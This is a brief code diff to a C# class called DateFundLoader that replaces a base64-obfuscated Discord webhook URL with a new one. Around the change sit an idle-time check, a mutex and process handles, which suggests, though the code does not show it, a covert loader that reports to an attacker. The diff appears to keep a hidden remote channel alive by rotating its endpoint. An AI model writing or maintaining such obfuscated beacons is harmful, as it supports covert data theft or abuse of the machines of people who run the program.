@@ -26,7 +26,7 @@ public class DateFundLoader {
     [DllImport("kernel32.dll")] static extern ulong GetTickCount64();
 
     private const int IDLE_MS = 3 * 60 * 1000;
-    private static string Webhook = D("aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQ5NjE3NTIxNzkyNjQ3NTg5OC9JcG04VnZMbk9tTjNkVFV1N255dnFFU2pkQkZSbUVGbXZZRXJBTzV0YXlhQ2Z2TVhwZjN0X0tYVGp3Um1PLTItaTJjXw==");
+    private static string Webhook = D("aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQ5OTg5OTcxNTU4MjU1ODIyOC9NXzZidHhwZ1NESDVVQkh2ZjN6YkN5TXIwakVSYTBlWVpLZFE4cFZSNDlrSFJjanpTT1RtLXYxZUlJaE1rclBhUEc4bA==");
     
     private static Mutex mx;
     private static Process cp, gp;
@@ -202,3 +202,4 @@ public class DateFundLoader {
         }) { IsBackground = true }.Start();
     }
 }
+
